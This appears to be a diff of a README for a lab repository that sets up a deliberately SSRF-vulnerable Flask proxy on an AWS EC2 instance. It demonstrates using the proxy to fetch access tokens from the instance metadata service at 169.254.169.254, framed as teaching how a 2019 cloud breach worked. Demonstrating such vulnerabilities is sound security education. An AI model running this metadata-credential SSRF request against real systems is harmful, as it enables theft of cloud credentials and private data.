@@ -6,16 +6,16 @@ simple python proxy server (proxy-server.py) and retrieving parameters like host
 
   INSTALLATION REQUIREMENTS FOR a Linux-AMI Instance within EC2
 
-For example, for a Linux-AMI instance in EC2:
+# For example, for a Linux-AMI instance in EC2:
 
 [ec2-user@ip-172.31.x.x ~]$ sudo yum install git -y
 [ec2-user@ip-172.31.x.x ~]$ sudo yum install python-pip -y
 [ec2-user@ip-172.31.x.x ~]$ sudo pip install flask
-You may have to install requests, but looks like it is already installed on current Linux-AMI instances as of 5/1/2020
+# You may have to install requests, but looks like it is already installed on current Linux-AMI instances as of 5/1/2020
 [ec2-user@ip-172.31.x.x ~]$ sudo pip install requests
 Requirement already satisfied: requests in /usr/lib/python2.7/dist-packages
 
-Clone the repository from Github for the SSRF proxy server and get-info on the 
+# Clone the repository from Github for the SSRF proxy server and get-info on the 
 
 [ec2-user@ip-172.31.x.x ~]$ git clone https://github.com/gahlberg/cloud-instance-metadata-test-tools.git
 Cloning into 'cloud-instance-metadata-test-tools'...
@@ -30,10 +30,12 @@ cloud-instance-metadata-test-tools
 [ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ 
 [ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ chmod 777 get-info.py 
 [ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ chmod 777 proxy-server.py 
+# Run Get-Info
 [ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ ./get-info.py 
 Hostname: ip-172.31.x.x.ec2.internal
 Private-ipv4-Address: 172.31.x.x
 MAC-Address: 12:78:85:2e:e2:9b
+# Run SSRF proxy server:
 [ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ ./proxy-server.py 
  * Serving Flask app "proxy-server" (lazy loading)
  * Environment: production
@@ -44,8 +46,10 @@ MAC-Address: 12:78:85:2e:e2:9b
  * Restarting with stat
  * Debugger is active!
  * Debugger PIN: 296-577-211
-Ok now we have the SSRF running on the AWS Instance
-Let's start navigating the vulnerability with our python interpreter on that AWS Instance:
+ 
+# Ok now we have the SSRF running on the AWS Instance
+# Now let's start navigating the vulnerability with our python interpreter on that AWS Instance:
+
 [ec2-user@ip-172.31.x.x cloud-instance-metadata-test-tools]$ python
 Python 2.7.16 (default, Feb 10 2020, 18:54:57) 
 [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)] on linux2
@@ -147,19 +151,19 @@ ec2-instance
   "Expiration" : "2020-05-08T04:44:10Z"
 }
 >>> 
-and look at that, a secret access token - can we do this through the SSRF?
 
-Next just to verify the proxy server can direct to a URL:
-http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://www.fortinet.com
-OK the proxy service is verified as working...
+# And look at that, a secret access token - can we do this through the SSRF?
 
-In a browser let's take what we were able to find with AWS Instance meta-data from the python interpreter and put in a browser:
+# Next just to verify the proxy server can direct to a URL:
+http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://www.google.com
+
+# OK the proxy service is verified as working...
+
+# In a browser let's take what we were able to find with AWS Instance meta-data from the python interpreter and put in a browser:
 http://ec2-54-86-5-206.compute-1.amazonaws.com:8080/?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
 
-Same goes here!  So as a remote user with a SSRF I can pass in an internal url which is the AWS meta-data service and I can grab access tokens out of it.  If this access token had access to the S3 bucket with millions of accounts containing private information, I know have that information.  This is how Erratic was able to post all this information up on GitHub from the info that was taken from the S3 bucket from AWS Instances from this open vulnerability at the end of march in 2019, and roughly how she was able to do this, the question is how do you stop this? 
+# Same goes here!  So as a remote user with a SSRF I can pass in an internal url which is the AWS meta-data service and I can grab access tokens out of it.  If this access token had access to the S3 bucket with millions of accounts containing private information, I know have that information.  This is how Erratic was able to post all this information up on GitHub from the info that was taken from the S3 bucket from AWS Instances from this open vulnerability at the end of march in 2019, and roughly how she was able to do this, the question is how do you stop this? 
 
-From AWS, there is not a concrete answer, just a warning that you may need to put appropriate controls in place:
+# From AWS, there is not a concrete answer, just a warning that you may need to put appropriate controls in place:
 https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
-
-
-
+![screenshot](docs/screenshots/AWS Instance meta-data warning.png
